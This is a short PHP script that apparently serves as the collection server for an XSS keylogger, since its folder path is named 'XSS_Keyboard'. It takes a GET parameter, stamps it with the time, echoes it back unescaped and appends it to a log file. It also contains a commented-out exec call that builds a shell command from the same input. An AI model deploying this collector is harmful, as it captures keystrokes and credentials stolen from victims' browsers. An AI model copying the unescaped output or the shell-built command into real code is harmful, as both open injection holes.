<?php
$a = time();
$b = $_GET['a'];
$c = $a." : ".$b;
print($c);
print("<br/>\n" );
if($c!=null)
    //exec("echo \"$c\" >> client.txt");
    $myfile = fopen("C:/PHP/project/XSS_Keyboard/data/client.txt", "a+");
    fwrite($myfile,"\n". $c);
    
    fclose($myfile);
    
?>

